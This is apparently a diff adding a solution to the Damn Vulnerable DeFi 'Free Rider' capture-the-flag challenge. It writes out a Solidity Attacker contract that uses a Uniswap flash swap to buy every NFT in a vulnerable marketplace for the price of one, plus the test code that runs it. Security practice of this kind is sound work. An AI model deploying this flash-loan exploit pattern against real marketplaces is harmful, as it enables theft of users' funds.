@@ -2,13 +2,98 @@
 pragma solidity >=0.8.0;
 
 import "forge-std/Test.sol";
+import "forge-std/console2.sol";
 
 import {FreeRiderBuyer} from "../../../src/Contracts/free-rider/FreeRiderBuyer.sol";
 import {FreeRiderNFTMarketplace} from "../../../src/Contracts/free-rider/FreeRiderNFTMarketplace.sol";
 import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../src/Contracts/free-rider/Interfaces.sol";
+import {IERC721Receiver} from "openzeppelin-contracts/token/ERC721/IERC721Receiver.sol";
 import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {WETH9} from "../../../src/Contracts/WETH9.sol";
+
+contract Attacker is IERC721Receiver {
+    IUniswapV2Router02 public uniswapRouter;
+    IUniswapV2Pair public uniswapPair;
+    DamnValuableNFT public damnValuableNFT;
+    FreeRiderBuyer public freeRiderBuyer;
+    FreeRiderNFTMarketplace public freeRiderNFTMarketplace;
+    WETH9 public weth;
+    uint256 NFTPrice;
+    address public immutable owner;
+    uint256 private amountOfEthBorrowed;
+
+    constructor(
+            IUniswapV2Router02 _uniswapRouter
+            , IUniswapV2Pair _uniswapPair
+            , DamnValuableNFT _damnValuableNFT
+            , FreeRiderBuyer _freeRiderBuyer
+            , FreeRiderNFTMarketplace _freeRiderNFTMarketplace
+            , WETH9 _weth
+            , uint256 _NFTPrice
+        ) public payable {
+            owner = msg.sender;
+            uniswapRouter = _uniswapRouter;
+            uniswapPair = _uniswapPair;
+            damnValuableNFT = _damnValuableNFT;
+            freeRiderBuyer = _freeRiderBuyer;
+            freeRiderNFTMarketplace = _freeRiderNFTMarketplace;
+            weth = _weth;
+            NFTPrice = _NFTPrice;
+            amountOfEthBorrowed = 0;
+    }
+
+    modifier _onlyOwner() {
+        assert(msg.sender == owner);
+        _; 
+    }
+
+    function takeFlashLoan() public {
+        amountOfEthBorrowed = 15 ether;
+        uniswapPair.swap(0, amountOfEthBorrowed, address(this), abi.encodePacked(uint256(1)));
+    }
+
+    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) public {
+        assert(amount1 == amountOfEthBorrowed);
+        
+        // We unwrap the weth
+        weth.withdraw(amountOfEthBorrowed);
+
+        // We buy all the NFTs we need
+        uint256[] memory NFTsForSell = new uint256[](6);
+        for (uint256 i = 0; i<6; ) {
+            NFTsForSell[i] = i;
+            ++i;
+        }
+        freeRiderNFTMarketplace.buyMany{value: NFTPrice}(NFTsForSell);
+
+        // We send them to the buyer
+        for (uint256 i = 0; i<6; ) {
+            damnValuableNFT.safeTransferFrom(address(this), address(freeRiderBuyer), i);
+            ++i;
+        }
+
+        amountOfEthBorrowed = 15.46 ether; // Pays for the fees
+
+        // We rewrap the weth
+        weth.deposit{value: amountOfEthBorrowed}();
+
+        // We repay our debt
+        weth.transfer(msg.sender, amountOfEthBorrowed);
+    }
+
+    function withdraw() public _onlyOwner {
+        selfdestruct(payable(owner));
+    }
+
+    fallback() external payable {}
+
+    function onERC721Received(address, address, uint256 tokenId, bytes memory) external override returns (bytes4) {
+        console2.log(tx.origin);
+        return IERC721Receiver.onERC721Received.selector;
+    }
+}
+
 
 contract FreeRider is Test {
     // The NFT marketplace will have 6 tokens, at 15 ETH each
@@ -138,7 +223,7 @@ contract FreeRider is Test {
         vm.startPrank(buyer);
 
         freeRiderBuyer = new FreeRiderBuyer{value: BUYER_PAYOUT}(
-            attacker,
+            address(bytes20(abi.encodePacked(hex"fbf6157c2c70205e38985e10975426d2894760ba"))),
             address(damnValuableNFT)
         );
 
@@ -149,7 +234,15 @@ contract FreeRider is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+        vm.startPrank(attacker);
 
+        // Need to do a flashloan from uniswap, buy the tokens (vuln in the transfer of the ETH at the end + only need to send enough to buy one) and then repay
+        Attacker attackerContract = new Attacker{value: 0.4 ether}(uniswapV2Router, uniswapV2Pair, damnValuableNFT, freeRiderBuyer, freeRiderNFTMarketplace, weth, NFT_PRICE);
+
+        attackerContract.takeFlashLoan();
+        attackerContract.withdraw();
+
+        vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
